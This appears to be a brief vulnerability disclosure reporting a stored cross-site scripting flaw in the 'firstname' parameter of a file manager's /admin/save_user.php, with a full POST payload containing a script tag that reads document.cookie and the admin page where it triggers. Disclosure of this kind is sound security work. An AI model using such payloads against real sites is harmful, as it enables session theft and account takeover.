BUG_Author: HaolunSong

Vulnerability File: /file_manager/admin/save_user.php

Parameter "firstname" (POST), exists stored cross-site scripting vulnerability

Payload:status=normal&emplnumber=2&firstname=<script>alert(document.cookie)</script>&lastname=3&region=zanzibar

![image](https://github.com/csbsong/bug_report/blob/main/xss1.png)

Payload will trigger when a user visits on http://localhost/file_manager/admin/admin_user.php

![image](https://github.com/csbsong/bug_report/blob/main/xss2.png)
